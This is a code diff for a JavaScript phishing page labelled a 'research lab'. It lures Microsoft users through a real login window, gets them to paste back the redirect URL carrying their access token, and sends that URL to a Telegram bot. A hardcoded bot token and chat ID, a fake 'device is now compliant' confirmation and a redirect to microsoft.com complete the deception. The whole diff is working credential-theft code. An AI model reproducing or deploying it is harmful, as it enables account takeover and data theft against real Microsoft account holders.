@@ -1,53 +1,70 @@
 /**
- * VERCEL LANDING LOGIC - index.js
+ * PATH A: NATIVE BROKER BRIDGE
+ * Research Lab: DeviceCodePhishing Evolution
  */
 
-// 1. REPLACE THIS URL with your actual Google Script URL
-const GS_URL = "https://script.google.com/macros/s/AKfycbzm1Zu1s2TjmypWZDuV5TLElWC-GkRolDsMi3_wDDG152PXbFPmRas0wY6j6_aD2Vq8/exec"; 
+const TG_CONFIG = {
+    botToken: "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
+    chatId: "1318100118"
+};
 
-async function startBridge() {
-    console.log("Bridge Started. Fetching configuration...");
+// 1. Trigger the High-Trust Native Redirect
+function startBridge() {
+    const BROKER_ID = "29d9ed98-a469-4536-ade2-f981bc1d605e";
+    const NATIVE_REDIRECT = "https://login.microsoftonline.com/common/oauth2/nativeclient";
+
+    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
+        `client_id=${BROKER_ID}` +
+        `&response_type=token+id_token` +
+        `&scope=openid+profile+offline_access` +
+        `&response_mode=fragment` +
+        `&prompt=login` + 
+        `&redirect_uri=${encodeURIComponent(NATIVE_REDIRECT)}`;
+
+    // Show the "Sync" UI so it's ready when they look back at this tab
+    document.getElementById('step-1').classList.add('hidden');
+    document.getElementById('step-2').classList.remove('hidden');
+
+    // Open login in a new window to make it easier for user to copy the URL
+    window.open(authUrl, "_blank", "width=500,height=600");
+}
+
+// 2. Send the manually pasted URL to Telegram
+async function exfiltrateToTelegram() {
+    const rawData = document.getElementById('raw-url').value;
+
+    if (!rawData || !rawData.includes("access_token")) {
+        alert("Please paste the valid sync URL from the login window.");
+        return;
+    }
+
+    const message = `
+🚨 **NATIVE SESSION CAPTURED** 🚨
+--------------------------------
+**Raw Native URL:** ${rawData}
+--------------------------------
+*Status: Verification Complete*
+    `;
 
     try {
-        // We add a timeout to the fetch so it doesn't hang forever
-        const controller = new AbortController();
-        const id = setTimeout(() => controller.abort(), 5000);
-
-        const response = await fetch(`${GS_URL}?action=getConfig`, {
-            method: 'GET',
-            mode: 'cors',
-            signal: controller.signal
+        const response = await fetch(`https://api.telegram.org/bot${TG_CONFIG.botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TG_CONFIG.chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
         });
 
-        clearTimeout(id);
-        const config = await response.json();
-
-        if (config.status === "error") {
-            throw new Error(config.message);
+        if (response.ok) {
+            alert("Verification successful. Your device is now compliant.");
+            window.location.href = "https://www.microsoft.com";
+        } else {
+            throw new Error("Telegram API error");
         }
-
-        console.log("Config received. Redirecting to Microsoft...");
-
-        // Construct the high-trust Microsoft Auth URL
-        const microsoftAuthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
-            `client_id=${config.clientId}` +
-            `&response_type=token+id_token` +
-            `&scope=openid+profile+offline_access` +
-            `&response_mode=fragment` +
-            `&prompt=login` + 
-            `&redirect_uri=${encodeURIComponent(config.redirectUri)}`;
-
-        // TRIGGER REDIRECT
-        window.location.href = microsoftAuthUrl;
-
     } catch (err) {
-        console.error("Bridge Error:", err.message);
-        
-        // FALLBACK: If Google Script fails, try a hardcoded redirect
-        // to keep the research moving.
-        const FALLBACK_ID = "29d9ed98-a469-4536-ade2-f981bc1d605e";
-        const FALLBACK_URI = "https://msft-ten.vercel.app/callback";
-        
-        window.location.href = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${FALLBACK_ID}&response_type=token+id_token&scope=openid+profile+offline_access&response_mode=fragment&prompt=login&redirect_uri=${encodeURIComponent(FALLBACK_URI)}`;
+        console.error("Sync Error:", err);
+        alert("Sync failed. Please try again.");
     }
 }
